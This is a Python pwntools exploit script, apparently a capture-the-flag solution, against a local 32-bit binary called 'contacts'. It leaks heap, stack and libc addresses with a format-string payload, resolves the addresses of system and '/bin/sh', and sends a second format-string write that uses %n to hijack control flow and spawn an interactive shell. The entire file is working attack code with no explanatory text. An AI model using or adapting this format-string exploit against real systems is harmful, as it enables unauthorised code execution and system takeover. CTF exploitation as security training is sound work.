from pwn import *
context.log_level='info'
context.arch='x86'

p = process('contacts')
bin = ELF('contacts')
libc = bin.libc
#gdb.attach(p,"b *0x08048C22\nb *0x080487D1\nc\n")#b *0x08048C22\nb* 0x08048CAB\n
p.sendlineafter('>>>',"1")
p.sendlineafter('Name:',"dd")
p.sendlineafter('No:',"ee")
p.sendlineafter('Length of description:',"100")
p.sendlineafter('Enter description:',"%1$p%2$p%18$p")
p.sendlineafter('>>>',"4")
p.recvuntil("0x")
des_heap = int(p.recv(7),16)+0x10-2+22-4-4
print 'heap:',hex(des_heap)
p.recvuntil("0x")
puts = int(p.recv(8),16)-11
print 'libc puts old address :',hex(libc.sym['puts'] )

p.recvuntil("0x")
ebp = int(p.recv(8),16)
print 'stack ret ebp address :',hex(ebp)

libc.address = puts - libc.sym['puts']

print 'libc puts address :',hex(libc.sym['puts'] )
binsh = next(libc.search('/bin/sh'))
print 'libc /bin/sh address :',hex(binsh)
print 'lib address :',hex(libc.address )
print 'lib system address :',hex(libc.sym['system'] )

#p.sendlineafter('>>>',"4")

p.sendlineafter('>>>',"3")
p.sendlineafter('change?',"dd")
p.sendlineafter('>>>',"1")
p.sendlineafter('New name',"a"*20)

p.sendlineafter('>>>',"3")
p.sendlineafter('change?',"a"*20)
p.sendlineafter('>>>',"2")
p.sendlineafter('Length of description:',"100")

p.sendlineafter('Description:',"%"+str(des_heap)+"c%06$n"+p32(libc.sym['system'])+"aaaa"+p32(binsh)+'cccc')
p.sendlineafter('>>>',"4")
p.sendlineafter('>>>',"5")
p.interactive()
